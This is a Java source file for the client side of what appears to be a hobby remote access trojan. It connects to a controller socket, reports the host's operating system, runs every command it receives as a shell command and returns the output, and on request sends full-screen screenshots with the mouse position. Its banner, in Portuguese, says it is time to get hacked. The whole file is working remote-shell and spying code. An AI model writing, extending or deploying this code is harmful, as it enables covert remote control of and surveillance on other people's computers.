import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.util.Scanner;

public class Client {
    static Connection connection;
    static OsCheck.OSType MY_OS;

    public static void main(String[] args) {
        try {
            System.out.println("Opa ta na hora de ser haskiado");
            connection = new Connection(new Socket("localhost", 27015));

            MY_OS = OsCheck.getOperatingSystemType();

            Message osMessage = new Message("print", "User is using " + MY_OS.name());
            connection.sendMessage(osMessage);

            while(true) {
                String command = connection.readMessage().getCommand();

                switch(command) {
                    case "screen":
                        sendScreenshot();
                        break;
                    default:
                        runTerminalCommand(MY_OS, command);
                }
            }
        } catch(Exception e) {
            e.printStackTrace();
        }
    }

    private static void runTerminalCommand(OsCheck.OSType os, String command) throws IOException {
        if(os.equals(OsCheck.OSType.Windows)) {
            Runtime.getRuntime().exec("cmd /c cd C:\\");
            command = "cmd /c" + command;
        }

        Process proc = Runtime.getRuntime().exec(command);
        Scanner respostaDoComando = new Scanner(proc.getInputStream());

        StringBuilder response = new StringBuilder();
        while(respostaDoComando.hasNext()) {
            response.append(respostaDoComando.nextLine() + "\n");
            response.append("---------------------------------------");
        }
        connection.sendMessage(new Message("print", response.toString()));
    }

    private static void sendScreenshot() throws AWTException, IOException {
        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage screenshot = new Robot().createScreenCapture(screenRect);

        int mouseX = MouseInfo.getPointerInfo().getLocation().x;
        int mouseY = MouseInfo.getPointerInfo().getLocation().y;

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(screenshot, "jpg", baos);
        baos.flush();
        byte[] imageBytes = baos.toByteArray();
        baos.close();

        connection.sendMessage(new Message("screen", imageBytes, mouseX, mouseY));
    }
}
